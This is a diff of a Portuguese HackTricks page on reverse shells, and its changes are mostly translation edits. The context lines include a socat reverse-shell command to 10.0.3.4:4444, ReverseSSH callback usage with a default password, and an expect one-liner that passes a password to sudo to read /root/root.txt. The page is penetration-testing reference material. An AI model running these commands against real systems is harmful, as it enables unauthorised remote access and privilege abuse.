@@ -10,7 +10,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 {% endhint %}
@@ -67,7 +67,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Uma maneira conveniente para **acesso a shell interativo**, bem como **transferências de arquivos** e **encaminhamento de portas**, é implantar o servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.
+Uma maneira conveniente de **acesso a shell interativo**, bem como **transferências de arquivos** e **encaminhamento de portas**, é implantar o servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.
 
 Abaixo está um exemplo para `x86` com binários comprimidos com upx. Para outros binários, verifique a [página de lançamentos](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -104,7 +104,7 @@ reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
 {% endcode %}
 
-* Se o pedido de encaminhamento de porta ReverseSSH foi bem-sucedido, você deve agora ser capaz de fazer login com a senha padrão `letmeinbrudipls` no contexto do usuário que está executando `reverse-ssh(.exe)`:
+* Se o pedido de encaminhamento de porta ReverseSSH foi bem-sucedido, você deve agora conseguir fazer login com a senha padrão `letmeinbrudipls` no contexto do usuário que está executando `reverse-ssh(.exe)`:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -114,13 +114,13 @@ sftp -P 8888 127.0.0.1
 ```
 ## Penelope
 
-Penelope (https://github.com/brightio/penelope) atualiza automaticamente shells reversas do Linux para TTY, gerencia o tamanho do terminal, registra tudo e muito mais. Também fornece suporte a readline para shells do Windows.
+[Penelope](https://github.com/brightio/penelope) atualiza automaticamente shells reversas do Linux para TTY, gerencia o tamanho do terminal, registra tudo e muito mais. Também fornece suporte a readline para shells do Windows.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
 ## Sem TTY
 
-Se por algum motivo você não conseguir obter um TTY completo, você **ainda pode interagir com programas** que esperam entrada do usuário. No exemplo a seguir, a senha é passada para `sudo` para ler um arquivo:
+Se por algum motivo você não conseguir obter um TTY completo, **ainda pode interagir com programas** que esperam entrada do usuário. No exemplo a seguir, a senha é passada para `sudo` para ler um arquivo:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
@@ -130,11 +130,11 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Suporte ao HackTricks</summary>
+<summary>Supporte o HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
